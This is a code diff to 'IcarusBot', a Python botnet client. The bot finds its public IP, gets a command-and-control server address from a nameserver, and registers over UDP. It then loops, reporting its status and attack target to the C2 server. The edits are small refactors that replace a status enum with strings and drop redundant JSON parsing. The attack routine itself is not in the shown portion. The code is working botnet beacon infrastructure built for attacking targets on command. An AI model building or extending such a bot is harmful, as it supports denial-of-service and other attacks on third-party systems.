@@ -36,7 +36,7 @@ class IcarusBot:
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
         self.c2_server_details = ()
 
-        self.status = BotAction.STARTED
+        self.status = 'STARTED'
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
 
@@ -93,7 +93,7 @@ class IcarusBot:
                 2.1 disconnect with the webserver and ignore it.
                 2.2 Go back to asking the nameserver for a IP address for a C2 server.
         """
-        self.status = BotAction.IDLE
+        self.status = 'IDLE'
 
         # Now we notify the bot of our existence
         init_message = {
@@ -103,8 +103,7 @@ class IcarusBot:
             'target': self.target_ip
         }
         init_message = json.dumps(init_message)
-        loaded_init = json.loads(init_message)
-        self.sock.sendto(str.encode(loaded_init), (self.c2_server_details[0], int(self.c2_server_details[1])))
+        self.sock.sendto(str.encode(init_message), (self.c2_server_details[0], int(self.c2_server_details[1])))
 
         # Now we just listen for message requests.
         while True:
@@ -124,7 +123,6 @@ class IcarusBot:
                         'target': self.target_ip
                     }
                     response = json.dumps(response)
-                    response = json.loads(response)
                 # This will then send the message back to the server, irrespective of the flag.
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
             except timeout or Exception:
@@ -151,13 +149,6 @@ class IcarusBot:
     #
     # def notification(self, param):
     #     pass
-
-
-class BotAction(Enum):
-    """enum to track the status of our icarus bot"""
-    STARTED = 'STARTED',
-    IDLE = 'IDLE',
-    ATTACKING = 'ATTACKING'
 
 
 def notification(action):
